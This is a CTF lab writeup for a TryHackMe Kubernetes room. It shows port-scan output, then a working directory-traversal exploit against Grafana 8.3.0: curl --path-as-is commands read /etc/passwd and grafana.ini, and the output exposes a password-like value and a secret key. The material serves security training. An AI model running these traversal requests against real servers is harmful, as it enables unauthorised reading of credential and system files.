---
A Kubernetes hacking challenge for DevOps/SRE enthusiasts.
---

# Kubernetes for Everyone — Writeup

## Overview
### Kubernetes for Everyone — Writeup
### Kubernetes for Everyone — Writeup
![](https://cncf-branding.netlify.app/img/projects/kubernetes/horizontal/color/kubernetes-horizontal-color.svg)
### Access the Cluster
Start Machine
To access a cluster, you need to know the location of the K8s cluster and have credentials to access it. Compromise the cluster and best of luck.
Use Nmap to find open ports and gain a foothold by exploiting a vulnerable service. If you are new at Nmap, take a look at the [Nmap room](https://tryhackme.com/room/furthernmap).
Answer the questions below

## Enumeration
```text
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.249.171 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.249.171:22
Open 10.10.249.171:111
Open 10.10.249.171:3000
Open 10.10.249.171:5000
Open 10.10.249.171:6443
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 10:44 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:44
Completed NSE at 10:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:44
Completed NSE at 10:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:44
Completed NSE at 10:44, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:44
Completed Parallel DNS resolution of 1 host. at 10:44, 2.01s elapsed
DNS resolution of 1 IPs took 2.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:44
Scanning 10.10.249.171 [5 ports]
Discovered open port 22/tcp on 10.10.249.171
Discovered open port 111/tcp on 10.10.249.171
Discovered open port 3000/tcp on 10.10.249.171
Discovered open port 5000/tcp on 10.10.249.171
Discovered open port 6443/tcp on 10.10.249.171
Completed Connect Scan at 10:44, 0.20s elapsed (5 total ports)
Initiating Service scan at 10:44
Scanning 5 services on 10.10.249.171
Completed Service scan at 10:46, 111.33s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.249.171.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 8.17s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 1.33s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
Nmap scan report for 10.10.249.171
Host is up, received user-set (0.20s latency).
Scanned at 2023-01-09 10:44:27 EST for 122s

PORT     STATE SERVICE           REASON  VERSION
22/tcp   open  ssh               syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e235e14f4e87459e5f2c97e0daa9dfd5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTRQx4ZmXMByEs6dg4VTz+UtM9X9Ljxt6SU3oceqRUlV+ohx56xdD0ZPbvD0IcYwUrrqcruMG0xxgRxWuzV+FQAJVQe76ED966+lwrwAnUsVFQ5apw3N+WKnD53eldUZRq7/2nGQQizrefY7UjAGX/EZonSVOWZyhVyONu2VBBwg0B0yA3UBZV+yg+jGsrZ9ETEmfNbQRkbodEAwoZrGQ87UEdTkfj+5TGmfzqgukmBvvVV7KoXgSQIZNkqRmkAVKKXeEfydnOR37KMglBUXIR/50jkIswxWbNk2OtS6fz6UiPeEY39f4f0gwLx/HwUyel9yzH4dkDb+LBS6X/X9b9
|   256 b2fd9b751c9e80195d134e8da0837bf9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAqCgW5Mlx2VpC61acc0G4VMZUAauQDoK5xIzdHzdDLPXt0GqsoIw1fuwTSSzSy8RFmGU5PNHiWn0egoUwlXdc4=
|   256 75200b4314a98a491ad92933e1b91ab6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFZ/jrfDX1aK1I0A/sLRVb2qoCF9xHWbVW+gBCV8dSmg
111/tcp  open  rpcbind           syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3000/tcp open  ppp?              syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 09 Jan 2023 15:45:10 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 09 Jan 2023 15:44:34 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 09 Jan 2023 15:44:42 GMT
|_    Content-Length: 0
5000/tcp open  http              syn-ack Werkzeug httpd 2.0.2 (Python 3.8.12)
|_http-server-header: Werkzeug/2.0.2 Python/3.8.12
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: Etch a Sketch
6443/tcp open  ssl/sun-sr-https? syn-ack
| ssl-cert: Subject: commonName=kubernetes/organizationName=kubernetes
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.svc.cluster.local, DNS:localhost, IP Address:127.0.0.1, IP Address:10.10.249.171, IP Address:FE80:0:0:0:AE:7CFF:FE0C:4991, IP Address:10.96.0.1
| Issuer: commonName=kubernetes-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-09T15:35:00
| Not valid after:  2024-01-09T15:35:00
| MD5:   50de96bca5e1118e4ae70020181f6ee8
| SHA-1: ca1ce9b8197bfe2535f8906d0018858e8faea313
| -----BEGIN CERTIFICATE-----
| MIIEBjCCAu6gAwIBAgIUV+XyCwxqBXodXzWwe49LnTH9MaswDQYJKoZIhvcNAQEL
| BQAwGDEWMBQGA1UEAxMNa3ViZXJuZXRlcy1jYTAeFw0yMzAxMDkxNTM1MDBaFw0y
| NDAxMDkxNTM1MDBaMCoxEzARBgNVBAoTCmt1YmVybmV0ZXMxEzARBgNVBAMTCmt1
| YmVybmV0ZXMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDYisMDsUqx
| HQ2i2J+37wzEp0/2jZ+ergYuHOoyGT5VnKP9rGI5k2nz7L0YLlWOP5i6WY/js26K
| ysM5hJXkALU+ZTjgEWFwcmru7QZp1lnetua4hBpkqXd2UwLxOMywLD3WhhjZKsk1
| f7tL1U+002Seqk+Ypi193/RCzgRCujeRL5+kiPSYE2yRgsmDvKR7oK3Pdsdk/+1v
| S1WgGu2egczC26UYKRMo3iKbRvUQFM5nAI3O79XIYoPZ4nmw32ZPKo8BYmOx1dWZ
| fHIQUwVcY3YsG3yFNM5fxReT8+VVx7ri51jEv+KndSrUAvwIY3ukzsxhxXEZHgam
| t3KbuouVVXy9AgMBAAGjggE0MIIBMDAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYw
| FAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFDTX
| ZTn25QUifZGWpQFQYsSQwcMyMB8GA1UdIwQYMBaAFFBlWtnEKpRN3QwmW51wacf+
| ooswMIGwBgNVHREEgagwgaWCCmt1YmVybmV0ZXOCEmt1YmVybmV0ZXMuZGVmYXVs
| dIIWa3ViZXJuZXRlcy5kZWZhdWx0LnN2Y4Iea3ViZXJuZXRlcy5kZWZhdWx0LnN2
| Yy5jbHVzdGVyghxrdWJlcm5ldGVzLnN2Yy5jbHVzdGVyLmxvY2Fsgglsb2NhbGhv
| c3SHBH8AAAGHBAoK+auHEP6AAAAAAAAAAK58//4MSZGHBApgAAEwDQYJKoZIhvcN
| AQELBQADggEBAIZgj1Vb2irJafp63EAl5lA/mK9SkcQYZVqZSfDf9ot/7HqD31+x
| MDVXBBf+vyzq5oJ+2F1OtaDM8EVdOSN53vHEH1h0WB54XFnDJPRaG30LofcoTRaf
| bgA5jNYy+6I+ilnPzENoUoupSTFsxnen0svBtVYWD+HMhUkoLSp30VkuQ1FeVNv6
| ojNobPlT/jEUui5ey85Agq/0exhi5V495iYv5ooTxlGpU8ounVl18E1VFHamCygI
| eUYpVLG+I6rjAK2CqXEKA437S9eM1MvsvUrT+kcKuC9Ah0cWJeXAPg3omLb5kEAH
| 2whZDytsGBV/dNLCHnruVzDiI3zDiP632PM=
|_-----END CERTIFICATE-----
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 90588589-9089-47ff-a8ec-003070ba7994
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 09 Jan 2023 15:45:16 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: fe3aaa6f-75f1-4566-a0b0-ad5028ef998b
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 09 Jan 2023 15:44:42 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: cca78da1-b5d3-4152-8cb2-f2a04b20f70d
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 09 Jan 2023 15:44:43 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.93%I=7%D=1/9%Time=63BC3662%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Control
SF::\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpire
SF:s:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\x
SF:20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content
SF:-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protecti
SF:on:\x201;\x20mode=block\r\nDate:\x20Mon,\x2009\x20Jan\x202023\x2015:44:
SF:34\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</
SF:a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCach
SF:e-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPrag
SF:ma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpOn
SF:ly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Op
SF:tions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon
SF:,\x2009\x20Jan\x202023\x2015:44:42\x20GMT\r\nContent-Length:\x200\r\n\r
SF:\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessi
SF:onReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\r
SF:\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=
SF:utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r
SF:\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt%
SF:252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;\
SF:x20mode=block\r\nDate:\x20Mon,\x2009\x20Jan\x202023\x2015:45:10\x20GMT\
SF:r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6443-TCP:V=7.93%T=SSL%I=7%D=1/9%Time=63BC366A%P=x86_64-pc-linux-gnu
SF:%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(GetRequest,14A,"HTTP/1\.0\x20401\x20Unauthorized\r\n
SF:Audit-Id:\x20fe3aaa6f-75f1-4566-a0b0-ad5028ef998b\r\nCache-Control:\x20
SF:no-cache,\x20private\r\nContent-Type:\x20application/json\r\nDate:\x20M
SF:on,\x2009\x20Jan\x202023\x2015:44:42\x20GMT\r\nContent-Length:\x20129\r
SF:\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"stat
SF:us\":\"Failure\",\"message\":\"Unauthorized\",\"reason\":\"Unauthorized
SF:\",\"code\":401}\n")%r(HTTPOptions,14A,"HTTP/1\.0\x20401\x20Unauthorize
SF:d\r\nAudit-Id:\x20cca78da1-b5d3-4152-8cb2-f2a04b20f70d\r\nCache-Control
SF::\x20no-cache,\x20private\r\nContent-Type:\x20application/json\r\nDate:
SF:\x20Mon,\x2009\x20Jan\x202023\x2015:44:43\x20GMT\r\nContent-Length:\x20
SF:129\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\
SF:"status\":\"Failure\",\"message\":\"Unauthorized\",\"reason\":\"Unautho
SF:rized\",\"code\":401}\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20cha
SF:rset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Ter
SF:minalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConn
SF:ection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,14A
SF:,"HTTP/1\.0\x20401\x20Unauthorized\r\nAudit-Id:\x2090588589-9089-47ff-a
SF:8ec-003070ba7994\r\nCache-Control:\x20no-cache,\x20private\r\nContent-T
SF:ype:\x20application/json\r\nDate:\x20Mon,\x2009\x20Jan\x202023\x2015:45
SF::16\x20GMT\r\nContent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\"apiV
SF:ersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"Un
SF:authorized\",\"reason\":\"Unauthorized\",\"code\":401}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.33 seconds

http://10.10.249.171:3000
Grafana login
"version":"8.3.0" (searching for an exploit)
https://www.exploit-db.com/exploits/50581

Directory Traversal
url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read

plugin_list = [
    "alertlist",

--path-as-is

Tell  curl to not handle sequences of /../ or /./ in the given URL path. Normally curl will squash or merge them according to standards but with this option set you tell it not to do that.
Example:
        curl --path-as-is https://example.com/../../etc/passwd

Grafana es un software libre basado en licencia de Apache 2.0, ​ que permite la visualización y el formato de datos métricos. Permite crear cuadros de mando y gráficos a partir de múltiples fuentes, incluidas bases de datos de series de tiempo como Graphite, InfluxDB y OpenTSDB.​​

https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/

from 8 to more
```

## Exploitation
```text
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://10.10.249.171:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd        
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:hereiamatctf907:/home/grafana:/sbin/nologin
```
```text
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://10.10.249.171:3000/public/plugins/alertlist/../../../../../../../../../../etc/grafana/grafana.ini
##################### Grafana Configuration Example #####################
#
```
```text
# Everything has defaults so you only need to uncomment things you want to
```
```text
# change
```
```text
# possible values : production, development
;app_mode = production
```
```text
# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}

#################################### Paths ####################################
[paths]
```
```text
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana
```
```text
# Temporary files in `data` directory older than given duration will be removed
;temp_data_lifetime = 24h
```
```text
# Directory where grafana can store logs
;logs = /var/log/grafana
```
```text
# Directory where grafana will automatically scan and look for plugins
;plugins = /var/lib/grafana/plugins
```
```text
# folder that contains provisioning config files that grafana will apply on startup and while running.
;provisioning = conf/provisioning

#################################### Server ####################################
[server]
```
```text
# Protocol (http, https, h2, socket)
;protocol = http
```
```text
# The ip address to bind to, empty will bind to all interfaces
;http_addr =
```
```text
# The http port  to use
;http_port = 3000
```
```text
# The public facing domain name used to access grafana from a browser
;domain = localhost
```
```text
# Redirect to correct domain if host header does not match domain
```
```text
# Prevents DNS rebinding attacks
;enforce_domain = false
```
```text
# The full public facing url you use in browser, used for redirects and emails
```
```text
# If you use reverse proxy and sub path specify full url (with sub path)
;root_url = %(protocol)s://%(domain)s:%(http_port)s/
```
```text
# Serve Grafana from subpath specified in `root_url` setting. By default it is set to `false` for compatibility reasons.
;serve_from_sub_path = false
```
```text
# Log web requests
;router_logging = false
```
```text
# the path relative working path
;static_root_path = public
```
```text
# enable gzip
;enable_gzip = false
```
```text
# https certs & key file
;cert_file =
;cert_key =
```
```text
# Unix socket path
;socket =
```
```text
# CDN Url
;cdn_url =
```
```text
# Sets the maximum time using a duration format (5s/5m/5ms) before timing out read of an incoming request and closing idle connections.
```
```text
# `0` means there is no timeout for reading the request.
;read_timeout = 0

#################################### Database ####################################
[database]
```
```text
# You can configure the database connection by specifying type, host, name, user and password
```
```text
# as separate properties or as on string using the url properties.
```
```text
# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
```
```text
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =
```
```text
# Use either URL or the previous fields to configure the database
```
```text
# Example: mysql://user:secret@host:port/database
;url =
```
```text
# For "postgres" only, either "disable", "require" or "verify-full"
;ssl_mode = disable
```
```text
# Database drivers may support different transaction isolation levels.
```
```text
# Currently, only "mysql" driver supports isolation levels.
```
```text
# If the value is empty - driver's default isolation level is applied.
```
```text
# For "mysql" use "READ-UNCOMMITTED", "READ-COMMITTED", "REPEATABLE-READ" or "SERIALIZABLE".
;isolation_level =

;ca_cert_path =
;client_key_path =
;client_cert_path =
;server_cert_name =
```
```text
# For "sqlite3" only, path relative to data_path setting
;path = grafana.db
```
```text
# Max idle conn setting default is 2
;max_idle_conn = 2
```
```text
# Max conn setting default is 0 (mean not set)
;max_open_conn =
```
```text
# Connection Max Lifetime default is 14400 (means 14400 seconds or 4 hours)
;conn_max_lifetime = 14400
```
```text
# Set to true to log the sql calls and execution times.
;log_queries =
```
```text
# For "sqlite3" only. cache mode setting used for connecting to the database. (private, shared)
;cache_mode = private

################################### Data sources #########################
[datasources]
```
```text
# Upper limit of data sources that Grafana will return. This limit is a temporary configuration and it will be deprecated when pagination will be introduced on the list data sources API.
;datasource_limit = 5000

#################################### Cache server #############################
[remote_cache]
```
```text
# Either "redis", "memcached" or "database" default is "database"
;type = database
```
```text
# cache connectionstring options
```
```text
# database: will use Grafana primary database.
```
```text
# redis: config like redis server e.g. `addr=127.0.0.1:6379,pool_size=100,db=0,ssl=false`. Only addr is required. ssl may be 'true', 'false', or 'insecure'.
```
```text
# memcache: 127.0.0.1:11211
;connstr =

#################################### Data proxy ###########################
[dataproxy]
```
```text
# This enables data proxy logging, default is false
;logging = false
```
```text
# How long the data proxy waits to read the headers of the response before timing out, default is 30 seconds.
```
```text
# This setting also applies to core backend HTTP data sources where query requests use an HTTP client with timeout set.
;timeout = 30
```
```text
# How long the data proxy waits to establish a TCP connection before timing out, default is 10 seconds.
;dialTimeout = 10
```
```text
# How many seconds the data proxy waits before sending a keepalive probe request.
;keep_alive_seconds = 30
```
```text
# How many seconds the data proxy waits for a successful TLS Handshake before timing out.
;tls_handshake_timeout_seconds = 10
```
```text
# How many seconds the data proxy will wait for a server's first response headers after
```
```text
# fully writing the request headers if the request has an "Expect: 100-continue"
```
```text
# header. A value of 0 will result in the body being sent immediately, without
```
```text
# waiting for the server to approve.
;expect_continue_timeout_seconds = 1
```
```text
# Optionally limits the total number of connections per host, including connections in the dialing,
```
```text
# active, and idle states. On limit violation, dials will block.
```
```text
# A value of zero (0) means no limit.
;max_conns_per_host = 0
```
```text
# The maximum number of idle connections that Grafana will keep alive.
;max_idle_connections = 100
```
```text
# How many seconds the data proxy keeps an idle connection open before timing out.
;idle_conn_timeout_seconds = 90
```
```text
# If enabled and user is not anonymous, data proxy will add X-Grafana-User header with username into the request, default is false.
;send_user_header = false
```
```text
# Limit the amount of bytes that will be read/accepted from responses of outgoing HTTP requests.
;response_limit = 0
```
```text
# Limits the number of rows that Grafana will process from SQL data sources.
;row_limit = 1000000

#################################### Analytics ####################################
[analytics]
```
```text
# Server reporting, sends usage counters to stats.grafana.org every 24 hours.
```
```text
# No ip addresses are being tracked, only simple counters to track
```
```text
# running instances, dashboard and error counts. It is very helpful to us.
```
```text
# Change this option to false to disable reporting.
;reporting_enabled = true
```
```text
# The name of the distributor of the Grafana instance. Ex hosted-grafana, grafana-labs
;reporting_distributor = grafana-labs
```
```text
# Set to false to disable all checks to https://grafana.net
```
```text
# for new versions (grafana itself and plugins), check is used
```
```text
# in some UI views to notify that grafana or plugin update exists
```
```text
# This option does not cause any auto updates, nor send any information
```
```text
# only a GET request to http://grafana.com to get latest versions
;check_for_updates = true
```
```text
# Google Analytics universal tracking code, only enabled if you specify an id here
;google_analytics_ua_id =
```
```text
# Google Tag Manager ID, only enabled if you specify an id here
;google_tag_manager_id =

#################################### Security ####################################
[security]
```
```text
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false
```
```text
# default admin user, created on startup
;admin_user = admin
```
```text
# default admin password, can be changed before first start of grafana,  or in profile settings
;admin_password = admin
```
```text
# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm
```
```text
# current key provider used for envelope encryption, default to static value specified by secret_key
;encryption_provider = secretKey
```
```text
# list of configured key providers, space separated (Enterprise only): e.g., awskms.v1 azurekv.v1
;available_encryption_providers =
```
```text
# disable gravatar profile images
;disable_gravatar = false
```
```text
# data source proxy whitelist (ip_or_domain:port separated by spaces)
;data_source_proxy_whitelist =
```
```text
# disable protection against brute force login attempts
;disable_brute_force_login_protection = false
```
```text
# set to true if you host Grafana behind HTTPS. default is false.
;cookie_secure = false
```
```text
# set cookie SameSite attribute. defaults to `lax`. can be set to "lax", "strict", "none" and "disabled"
;cookie_samesite = lax
```
```text
